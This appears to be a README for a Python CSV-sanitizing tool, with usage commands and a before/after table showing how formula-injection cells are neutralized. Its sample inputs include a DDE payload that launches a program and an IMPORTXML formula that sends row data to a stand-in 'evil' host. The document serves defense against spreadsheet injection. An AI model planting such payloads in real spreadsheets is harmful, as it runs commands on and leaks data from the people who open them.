# Sanitize CSV Script README
## Operating environment python3
### Usage method
```
git clone https://github.com/zhizhi10/sanitize_csv.git
cd sanitize_csv
chmod +x sanitize_csv.py
### ./sanitize_csv.py -h
./sanitize_csv.py your_csv_file.csv -o /vol/xxx/clean_your_csv_file.csv
```
The generated filename is clean_your_csv_file.csv

### Comparison Before and After Cleaning

| Data Before Cleaning                                                                                                         | Data After Cleaning                                                                                                                   |
|------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------|
| UserId,BillToDate,ProjectName,Description,DurationMinutes                                                                    | "UserId","BillToDate","ProjectName","Description","DurationMinutes"                                                                   |
| "1","2017-07-25","Test Project","Flipped the jibbet","60"                                                                    | "1","2017-07-25","Test Project","Flipped the jibbet","60"                                                                             |
| 2,2017-07-25,Important Client,"Bop, dop, and giglip", 240                                                                    | "2","2017-07-25","Important Client","Bop, dop, and giglip"," 240"                                                                     |
| 2,2017-07-25,Important Client,"=2+5", 240                                                                                    | "2","2017-07-25","Important Client","'=2+5"," 240"                                                                                    |
| 2,2017-07-25,Important Client,"=2+5+cmd\| ' /C calc'!A0", 240                                                                | "2","2017-07-25","Important Client","'=2+5+\|' /C calc'!A0"," 240"                                                                    |
| 2,2017-07-25,Important Client,"=IMPORTXML(CONCAT(""http://some-server-with-log.evil?v="", CONCATENATE(A2:E2)), ""//a"")",240 | "2","2017-07-25","Important Client","'=IMPORTXML(CONCAT(""http://some-server-with-log.evil?v="", CONCATENATE(A2:E2)), ""//a"")","240" |
| =1+2";=1+2                                                                                                                   | "'=1+2"";=1+2"                                                                                                                        |

### warning

Due to the program’s inability to determine whether commas outside of quotation marks are separators, the cleaning result of `=1+2'" ;,=1+2` is `'=1+2'"" ;","'=1+2"`, not `'=1+2'"" ;,=1+2”`.
